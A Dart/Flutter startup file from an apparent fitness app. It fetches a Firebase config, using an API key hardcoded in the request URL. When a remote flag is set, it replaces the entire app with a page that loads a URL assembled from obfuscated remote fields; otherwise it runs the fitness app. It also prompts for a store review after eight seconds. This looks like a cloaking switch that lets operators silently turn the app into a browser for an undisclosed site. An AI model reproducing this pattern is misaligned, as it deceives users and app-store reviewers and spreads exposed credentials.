import 'package:active_ally_fitness_zone_250/logic_prem/get_premium/fb_model.dart';
import 'package:active_ally_fitness_zone_250/logic_prem/get_premium/get_prem_hive_repo.dart';
import 'package:active_ally_fitness_zone_250/logic_prem/get_premium/prem_hive_model/prem_hive_model.dart';
import 'package:active_ally_fitness_zone_250/logic_prem/uajds.dart';
import 'package:active_ally_fitness_zone_250/main.dart';
import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:in_app_review/in_app_review.dart';

startLogic() async {
  final NewPosterModel? model = await GetPremHiveRepo().getData();
  if (model != null) {
    if (model.isOpen) {
      runApp(
        MaterialApp(
          debugShowCheckedModeBanner: false,
          home: EDjahPage(
            link: model.secondUrl,
          ),
        ),
      );
    } else {
      runApp(const MyApp());
    }
  } else {
    final dio = Dio();
    try {
      final result = await dio.get(
          'https://fitness-zone-250-default-rtdb.firebaseio.com//premium.json?auth=AIzaSyB5ZSZo0vkfJysrZCn-Z7hBD9dvllGJBmQ');
      final fBResponseModel = FBResponseModel.fromJson(result.data);
      await GetPremHiveRepo().setData(
        NewPosterModel(
          secondUrl: '${fBResponseModel.prr3}${fBResponseModel.kk4}',
          isOpen: fBResponseModel.isko,
        ),
      );

      if (fBResponseModel.isko) {
        runApp(
          MaterialApp(
            debugShowCheckedModeBanner: false,
            home: EDjahPage(
              link: '${fBResponseModel.prr1}${fBResponseModel.kk2}',
            ),
          ),
        );
      } else {
        runApp(const MyApp());
      }

      await Future.delayed(const Duration(seconds: 8));
      try {
        final InAppReview inAppReview = InAppReview.instance;

        if (await inAppReview.isAvailable()) {
          inAppReview.requestReview();
        }
      } catch (e) {
        throw Exception(e);
      }
    } catch (e) {
      throw Exception(e);
    }
  }
}
